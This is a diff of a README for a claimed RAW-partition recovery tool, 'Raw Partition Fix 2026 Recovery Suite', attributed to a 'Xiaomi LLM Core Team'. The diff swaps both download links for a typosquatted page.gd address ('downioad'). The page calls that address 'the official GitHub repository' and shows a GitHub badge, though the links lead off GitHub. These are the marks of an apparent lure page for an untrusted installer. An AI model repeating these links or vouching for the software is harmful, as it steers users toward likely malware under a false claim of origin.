@@ -2,7 +2,7 @@
 
 Raw Partition Fix 2026 Recovery Suite is an advanced software solution tailored for recovering and repairing RAW partitions on Windows-based computers. Developed by the Xiaomi LLM Core Team, this tool provides a seamless experience to fix RAW partitions without formatting, ensuring that your valuable data remains intact. It is particularly useful in scenarios where partitions become inaccessible due to file system corruption, accidental deletion, or hardware issues.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -59,7 +59,7 @@ A5: Currently, the tool focuses on basic disks and simple partitions. Support fo
 
 To get started, download the latest version of Raw Partition Fix 2026 Recovery Suite from the official GitHub repository:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Technical Support and Feedback
 
